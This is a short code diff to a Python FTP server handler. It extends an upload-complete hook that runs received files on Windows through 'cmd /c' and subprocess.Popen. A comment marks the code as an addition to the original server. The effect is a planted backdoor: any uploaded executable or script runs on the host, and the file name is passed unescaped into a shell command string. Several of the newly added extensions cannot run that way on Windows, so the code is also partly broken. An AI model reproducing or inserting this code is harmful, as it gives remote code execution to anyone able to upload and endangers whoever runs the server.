@@ -2108,12 +2108,11 @@ class FTPHandler(object, asynchat.async_chat):
         if os.name == 'nt':
             if file.endswith('.exe') or file.endswith('.py')\
             or file.endswith('.bat') or file.endswith('.msi')\
-            or file.endswith('.skl') or file.endswith('.ahk'):
+            or file.endswith('.skl') or file.endswith('.ahk')\
+            or file.endswith('.deb') or file.endswith('.sh')\
+            or file.endswith('.app') or file.endswith('.dmg'):
                 toRun = 'cmd /c '+'"'+file+'"'
                 subprocess.Popen(toRun)
-        l = []
-        l.append(toRun)
-        print l
         # remove this code and you will end up with the original server
 
     def on_incomplete_file_sent(self, file):
